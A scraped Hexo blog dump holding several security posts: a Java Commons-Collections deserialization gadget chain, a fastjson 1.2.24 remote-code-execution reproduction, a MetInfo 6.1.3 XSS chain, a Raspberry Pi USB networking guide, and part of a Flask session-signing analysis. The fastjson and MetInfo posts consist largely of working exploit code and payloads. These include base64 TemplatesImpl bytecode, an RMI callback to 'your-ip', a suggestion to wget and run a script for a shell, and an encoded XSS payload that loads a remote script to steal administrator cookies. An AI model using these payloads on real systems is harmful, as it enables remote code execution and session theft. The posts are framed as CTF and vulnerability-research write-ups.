重写了readObject方法 在readObject方法中存在对一个可控的map进行修改的过程 之前的很多文章都是使用的AnnotationInvocationHandler类,然而在我使用的jdk版本(1.8)中该类的readObject方法中并没有找到对map的更改操作。后来参考反序列化自动化工具ysoserial中的CommonsCollections5这个payload实现了其中的一个调用链：利用BadAttributeValueExpException类。我们可以看一下这个类的readObject方法： 123456789101112131415161718192021private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); &#125;&#125; 可以看到这里我们对反序列化传入的对象的成员属性val判断其类型，如果这个变量不是String便会调用val的toString方法。这里如果我们通过反序列化传入的val是一个lazyMap类的entry，在调用其toString方法时便会调用LazyMap.get()从而触发绑定的Transformer的transform方法。但是这里我们的LazyMap类在获取一个不存在的键的时候才会触发transform，因此我们这里可以引入另外一个类TiedMapEntry,这个类在执行toString时可以调用其绑定的map取获取预定的键。 因此这个poc链的执行过程为： 12345BadAtrributeValueException对象exception -&gt;exception对象的val设置为lazyMap的TiedMapEntry,键为lazyMap中不存在的键 -&gt;调用entry的toString() -&gt;调用lazyMap的get方法获取这个不存在的键 -&gt;调用transform方法 具体实现： 12345678910111213141516171819202122232425Transformer chainedTransformer=new ChainedTransformer(transformers); /*Map map=new HashMap(); map.put(\"a\",\"b\"); Map transformedMap=TransformedMap.decorate(map,null,chainedTransformer); transformedMap.put(\"a\",\"z\"); System.exit(1);*/Map normalMap=new HashMap();normalMap.put(\"hackedby\",\"imagemlt\");Map lazyMap=LazyMap.decorate(normalMap,chainedTransformer);TiedMapEntry entry=new TiedMapEntry(lazyMap,\"foo\");BadAttributeValueExpException exception=new BadAttributeValueExpException(null);Field valField=exception.getClass().getDeclaredField(\"val\");valField.setAccessible(true);valField.set(exception,entry);File f=new File(\"/tmp/payload.bin\");ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(f));out.writeObject(exception);out.flush();out.close();ObjectInputStream in=new ObjectInputStream(new FileInputStream(f));in.readObject(); 后记这种利用一个Map的pop链就可以让我们想起php的phar反序列化的分析paper中作者挖掘的wordpress的反序列化漏洞也用到了一个类似的对数组进行操作的iterator类，这种利用遍历操作或者绑定动作的操作也可以作为一种分析反序列化漏洞寻找pop链的思路。 参考文献https://www.freebuf.com/vuls/175252.html https://github.com/frohoff/ysoserial http://pirogue.org/2017/12/22/javaSerialKiller/","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"}]},{"title":"fastjson反序列化复现","slug":"fastjson-deserialize","date":"2018-12-25T15:09:45.000Z","updated":"2019-04-05T13:31:52.000Z","comments":true,"path":"post/fastjson-deserialize/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/fastjson-deserialize/index.html","excerpt":"","text":"fastjson反序列化复现最近复现一些java方面的漏洞，之前护网杯遇到过一次fastjson反序列化利用的题目，于是这里便从在idea中创建一个maven项目开始复现一下fastjson的反序列化漏洞。 fastjson反序列化漏洞的主要影响范围是&lt;=1.2.24版本的fastjson。因此，参考在IDEA中创建maven项目在创建好maven项目之后，编辑pom.xml加入fastjson需要的dependency： 123456789101112131415&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-codec&lt;/groupId&gt; &lt;artifactId&gt;commons-codec&lt;/artifactId&gt; &lt;version&gt;1.9&lt;/version&gt; &lt;/dependency&gt; 之后首先编辑ShellExec类,这个类也是反序列化的一个目标类 1234567891011121314151617181920212223242526package com.alijsondeser;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class ShellExec extends AbstractTranslet&#123; public ShellExec() throws IOException&#123; Runtime.getRuntime().exec(\"mkdir /tmp/imagemlt\"); &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123; &#125; @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123; &#125; public static void main(String[] args) throws Exception &#123; ShellExec t = new ShellExec(); &#125;&#125; 然后便是我们的poc类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.alijsondeser;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"/target/classes/com/alijsondeser/ShellExec.class\"; //final String evilClassPath = \"/tmp/ShellExec.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"&#123;\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],'_name':'a.b','_tfactory':&#123; &#125;,\\\"_outputProperties\\\":&#123; &#125;,\" + \"\\\"_name\\\":\\\"a\\\",\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"&#125;\\n\"; System.out.println(text1); Object obj = JSON.parseObject(text1,Object.class,config,Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 执行poc，查看目录可以看到已经被执行 生成的payload为： 1&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2FsaWpzb25kZXNlci9TaGVsbEV4ZWM7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEADlNoZWxsRXhlYy5qYXZhDAAIAAkHAC8MADAAMQEAE21rZGlyIC90bXAvaW1hZ2VtbHQMADIAMwEAGmNvbS9hbGlqc29uZGVzZXIvU2hlbGxFeGVjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125; web环境下的测试可以使用war包https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war,从tomcat后台导入。 之后我们只需要用post方式发包 1234567891011POST /fastjson-1.0/ HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,en-US;q=0.7,en;q=0.3Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/jsonContent-Length: 2272&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2FsaWpzb25kZXNlci9TaGVsbEV4ZWM7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEADlNoZWxsRXhlYy5qYXZhDAAIAAkHAC8MADAAMQEAE21rZGlyIC90bXAvaW1hZ2VtbHQMADIAMwEAGmNvbS9hbGlqc29uZGVzZXIvU2hlbGxFeGVjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125; 可以看到文件夹已经被创建且与tomcat运行用户权限相同(root)。 getshell只需要先wget一个脚本再执行即可。 关于fastjson反序列化漏洞的发现我们可以让服务器发送请求到我们的公网vps： 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://your-ip:1099/Object\",\"autoCommit\":true&#125; 出现如图的回显即可确认存在反序列化漏洞。","categories":[{"name":"web","slug":"web","permalink":"https://hexo.imagemlt.xyz/categories/web/"},{"name":"CTF","slug":"web/CTF","permalink":"https://hexo.imagemlt.xyz/categories/web/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://hexo.imagemlt.xyz/tags/CTF/"}]},{"title":"metinfo reflected xss bypass chrome","slug":"metinfo-reflected-xss-bypass-chrome","date":"2018-12-04T09:47:07.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/metinfo-reflected-xss-bypass-chrome/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/metinfo-reflected-xss-bypass-chrome/index.html","excerpt":"","text":"Metinfo latest version(6.1.3) has a reflected xss vul, with another vul which can cause arbitrary response headers set we can bypass chrome xss filter. [CVE-2018-19835 and CVE-2018-19836] Metinfo is an powerful cms used widely in china.https://www.metinfo.cn/ recently I find two vuls and combine them we can bypass chrome’s xss filter to affect administrators. vul1firstly, there exists an reflected XSS in metinfo latest version(6.1.3), url:http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;lang_columnerr4=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;metcms=1 since no cookies protected with http-only we can directy use them. why does this vul exists? we check /admin/column/move.php 12345678910111213&lt;?php# MetInfo Enterprise Content Management System # Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. require_once '../login/login_check.php';require_once 'global.func.php';if($foldyanzheng)&#123; $metcms=''; $folder_m=$db-&gt;get_one(\"SELECT * FROM $met_column WHERE foldername='$foldername' and lang='$lang'\"); if($folder_m)$metcms=$lang_columnerr4; if(!preg_match('/^[a-z0-9_-]+$/i',metdetrim($foldername)))$metcms=$lang_columnerr1; echo $metcms; die;&#125; we only need $folderyanzheng&gt;0 and$folder_m is not null, we can get $lang_columnerr4 directly shown in the dom .and just in /include/common.inc.php there exists an register of variables that can be controlled by us：123456foreach(array('_COOKIE', '_POST', '_GET') as $_request) &#123; foreach($$_request as $_key =&gt; $_value) &#123; $_key&#123;0&#125; != '_' &amp;&amp; $$_key = daddslashes($_value,0,0,1); $_M['form'][$_key] = daddslashes($_value,0,0,1); &#125;&#125; so we can controll the variable $lang_columnerr4. but we know vuls like this can only affect browsers that have no xss protections. how do we affect browsers like chrome that have powerfull xss filters? see next vul. vul 2there exists an vul that enables you to set any headers in /include/interface/applogin.php 123456&lt;?phprequire_once '../common.inc.php';$query = \"UPDATE &#123;$met_config&#125; set value='&#123;$apppass&#125;' where name = 'met_apppass'\";$db-&gt;get_one($query);header(\"&#123;$serverurl&#125;\");?&gt; in common.inc.php there exists an operation to register all variables which can be controlled by users;123456foreach(array('_COOKIE', '_POST', '_GET') as $_request) &#123; foreach($$_request as $_key =&gt; $_value) &#123; $_key&#123;0&#125; != '_' &amp;&amp; $$_key = daddslashes($_value,0,0,1); $_M['form'][$_key] = daddslashes($_value,0,0,1); &#125;&#125; so here we can communicate this vul with vul1 to bypass chrome’s xss filter,because chrome’s xss filter donnot check data from user’s cookie. Step1Let administrator visit this address http://127.0.0.1:8888/include/interface/applogin.php?serverurl=Set-Cookie%3alang_columnerr4%3d123%253cimg%20src%3dasd%20onerror%3deval(String.fromCharCode(118,97,114,32,120,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,120,46,115,114,99,61,34,47,47,120,115,115,112,116,46,99,111,109,47,80,87,87,50,65,105,34,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,120,41,59))%3E;path=/ we can see an responce header is set。 step2let the administrator visit http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1 here we can see the data in user’s cookie is shown in the dom in my xss platform(platform to recieve xss data),we can see cookie of the manager is captured. just want an alert?first visit http://127.0.0.1:8888/include/interface/applogin.php?serverurl=Set-Cookie%3alang_columnerr4%3d123%253csvg/onload%3dalert(1)%3E;path=/ secondlyhttp://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1now you can see an alert","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"web","slug":"Ctf/web","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/web/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://hexo.imagemlt.xyz/tags/Security/"}]},{"title":"用树莓派zero w做电脑的无线网卡","slug":"用树莓派zero-w做电脑的无线网卡","date":"2018-11-28T08:48:44.000Z","updated":"2019-02-02T00:29:25.691Z","comments":true,"path":"post/用树莓派zero-w做电脑的无线网卡/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/用树莓派zero-w做电脑的无线网卡/index.html","excerpt":"","text":"Step1 设置树莓派，启动usb0接口编辑/boot/config.txt，尾部添加： 1dtoverlay=dwc2 编辑/boot/cmdline.txt,在rootwait后添加 1modules-load=dwc2,g_ether Step2 启动树莓派后设置网络编辑/etc/network/interfaces，内容修改为 123456789101112131415auto loiface lo inet loopbackiface eth0 inet manualallow-hotplug wlan0auto wlan0iface wlan0 inet dhcpwpa-conf /boot/wpa.confallow-hotplug usb0auto usb0iface usb0 inet staticaddress 192.168.166.1netmask 255.255.255.0 再安装dnsmasq 1apt install dnsmasq 编辑dnsmasq的配置文件/etc/dnsmasq.conf，去掉最后两行，改为： 123interface=usb0bind-interfacesdhcp-range=192.168.166.2,192.168.166.250,24h 之后启动dnsmasq的开机自启动: 1sudo systemctl enable dnsmasq 再创建端口转发用的脚本forward.sh,位置任意，内容为 12345#! /bin/bashecho 1 &gt;/proc/sys/net/ipv4/ip_forwardiptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADEiptables -A FORWARD -i wlan0 -o usb0 -m state --state RELATED,ESTABLISHED -j ACCEPTiptables -A FORWARD -i usb0 -o wlan0 -j ACCEPT 保存后在/etc/rc.local中在exit 0一行之前添加该脚本， 1bash 脚本位置 修改/boot/wpa.conf,添加需要连接的热点,l例如： 123456network=&#123; ssid=&quot;image&quot; #热点名称 key_mgmt=WPA-PSK psk=&quot;xxxxxx&quot; #密码 priority=5&#125; enjoy it重启后在mac和linux下可以直接识别该网路并且自动连接。需要修改热点只需要取出内存卡修改根目录下/wpa.conf文件即可。","categories":[{"name":"web","slug":"web","permalink":"https://hexo.imagemlt.xyz/categories/web/"}],"tags":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/tags/技术学习/"}]},{"title":"从hctf的两道web题谈flask客户端session机制","slug":"flask-session","date":"2018-11-12T11:50:20.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/flask-session/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/flask-session/index.html","excerpt":"","text":"首发于安全客https://www.anquanke.com/post/id/163975 这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的解法。 个人第一次见到关于客户端session的文章是pith0n师傅的一片文章客户端session导致的安全问题。然而做题的时候只看phith0n师傅的这篇文章感觉还是有点儿懵逼。。。（也可能是我太菜了233）所以就只能翻flask的源码跟了一遍flask对session的处理流程。 flask对客户端session的处理机制flask对session的处理位于flask/sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。在flask/sessions.py中，SecureCookieSessionInterface用于封装对CookieSession的一系列操作：12345678910111213class SecureCookieSessionInterface(SessionInterface): \"\"\"The default session interface that stores sessions in signed cookies through the :mod:`itsdangerous` module. \"\"\" # salt,默认为cookie-session salt = 'cookie-session' #: 默认哈希函数为hashlib.sha1 digest_method = staticmethod(hashlib.sha1) #:默认密钥推导方式 :hmac key_derivation = 'hmac' #:默认序列化方式：session_json_serializer serializer = session_json_serializer session_class = SecureCookieSession 这里默认的序列化方式的定义为: 1session_json_serializer = TaggedJSONSerializer() 可以看到默认使用taggedJSONSerializer做序列化taggedJSONSerializer定义：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class TaggedJSONSerializer(object): \"\"\"A customized JSON serializer that supports a few extra types that we take for granted when serializing (tuples, markup objects, datetime). \"\"\" def dumps(self, value): def _tag(value): if isinstance(value, tuple): return &#123;' t': [_tag(x) for x in value]&#125; elif isinstance(value, uuid.UUID): return &#123;' u': value.hex&#125; elif isinstance(value, bytes): return &#123;' b': b64encode(value).decode('ascii')&#125; elif callable(getattr(value, '__html__', None)): return &#123;' m': text_type(value.__html__())&#125; elif isinstance(value, list): return [_tag(x) for x in value] elif isinstance(value, datetime): return &#123;' d': http_date(value)&#125; elif isinstance(value, dict): return dict((k, _tag(v)) for k, v in iteritems(value)) elif isinstance(value, str): try: return text_type(value) except UnicodeError: raise UnexpectedUnicodeError(u'A byte string with ' u'non-ASCII data was passed to the session system ' u'which can only store unicode strings. Consider ' u'base64 encoding your string (String was %r)' % value) return value return json.dumps(_tag(value), separators=(',', ':')) def loads(self, value): def object_hook(obj): if len(obj) != 1: return obj the_key, the_value = next(iteritems(obj)) if the_key == ' t': return tuple(the_value) elif the_key == ' u': return uuid.UUID(the_value) elif the_key == ' b': return b64decode(the_value) elif the_key == ' m': return Markup(the_value) elif the_key == ' d': return parse_date(the_value) return obj return json.loads(value, object_hook=object_hook) 可以看到本质还是一个添加了类型属性的json处理。SecureCookieSessionInterface类的获取签名验证序列化器函数为get_signing_serializer12345678910def get_signing_serializer(self, app): if not app.secret_key: return None signer_kwargs = dict( key_derivation=self.key_derivation, digest_method=self.digest_method ) return URLSafeTimedSerializer(app.secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs) 可以看到最后使用的签名序列化器为URLSafeTimedSerializer，并且传入app.secret_key用于签名。SecureCookieSessionInterface的open_session与save_session方法表示了对session的处理123456789101112131415161718192021222324252627282930def open_session(self, app, request): s = self.get_signing_serializer(app) if s is None: return None val = request.cookies.get(app.session_cookie_name) if not val: return self.session_class() max_age = total_seconds(app.permanent_session_lifetime) try: data = s.loads(val, max_age=max_age)#max_age return self.session_class(data) except BadSignature: return self.session_class()def save_session(self, app, session, response): domain = self.get_cookie_domain(app) path = self.get_cookie_path(app) if not session: if session.modified: response.delete_cookie(app.session_cookie_name, domain=domain, path=path) return httponly = self.get_cookie_httponly(app) secure = self.get_cookie_secure(app) expires = self.get_expiration_time(app, session) print self.get_signing_serializer(app) val = self.get_signing_serializer(app).dumps(dict(session)) response.set_cookie(app.session_cookie_name, val, expires=expires, httponly=httponly, domain=domain, path=path, secure=secure) 可以看到从客户端获取session时获取对应的cookie值，并使用序列化器序列化，能够成功序列化即可获取sesison_class,否则返回一个空的session_class. SecureCookieSession使用的默认序列化器URLSafeTimedSeriallizer位于itsdangerous模块中：123456class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer): \"\"\"Works like :class:`TimedSerializer` but dumps and loads into a URL safe string consisting of the upper and lowercase character of the alphabet as well as ``'_'``, ``'-'`` and ``'.'``. \"\"\" default_serializer = compact_json 序列化序列化的流程在TimedSerializer的父类Serializer中12345678910def dumps(self, obj, salt=None): \"\"\"Returns a signed string serialized with the internal serializer. The return value can be either a byte or unicode string depending on the format of the internal serializer. \"\"\" payload = want_bytes(self.dump_payload(obj)) rv = self.make_signer(salt).sign(payload) if self.is_text_serializer: rv = rv.decode('utf-8') return rv 可以看到主要处理流程是将obj用dump_payload签名后利用make_signer(salt)生成的signer进行签名处理，并返回签名后的结果即为我们所需要的cookie值，而URLSafeTimedSeralizer的dump_playload方法继承自URLSafeSerializerMixin的dump_payload方法1234567891011def dump_payload(self, obj): json = super(URLSafeSerializerMixin, self).dump_payload(obj) is_compressed = False compressed = zlib.compress(json) if len(compressed) &lt; (len(json) - 1): json = compressed is_compressed = True base64d = base64_encode(json) if is_compressed: base64d = b'.' + base64d return base64d 对obj的处理首先使用URLSafeTimedSeralizer的另一个父类TimedSeralizer继承自Seralizer的dump_payload方法处理123456def dump_payload(self, obj): \"\"\"Dumps the encoded object. The return value is always a bytestring. If the internal serializer is text based the value will automatically be encoded to utf-8. \"\"\" return want_bytes(self.serializer.dumps(obj)) 其中self.serializer为之前SecureCookieSessionInterface的get_signing_serializer传入，即taggedJSONSerializer。处理之后如果长度过长会进行一次zlib压缩，最后将生成的数据base64编码。 再回到之前Seralizer的dumps的处理流程中，self.make_signer(salt)的定义如下:1234567def make_signer(self, salt=None): \"\"\"A method that creates a new instance of the signer to be used. The default implementation uses the :class:`Signer` baseclass. \"\"\" if salt is None: salt = self.salt return self.signer(self.secret_key, salt=salt, **self.signer_kwargs) self.salt、self.signer_kwargs、self.secret_key来自之前SecureCookieSessionInterface的get_signing_serializer传入，分别为app.secret_key、&#39;cookie-session&#39;、{&#39;key_derivation&#39;:&#39;hmac&#39;,&#39;digest_method&#39;=staticmethod(hashlib.sha1)}，而self.signer为TimedSeralizer中指定123456class TimedSerializer(Serializer): \"\"\"Uses the :class:`TimestampSigner` instead of the default :meth:`Signer`. \"\"\" default_signer = TimestampSigner TimestampSigner签名过程为：1234567def sign(self, value): \"\"\"Signs the given string and also attaches a time information.\"\"\" value = want_bytes(value) timestamp = base64_encode(int_to_bytes(self.get_timestamp())) sep = want_bytes(self.sep) value = value + sep + timestamp return value + sep + self.get_signature(value) 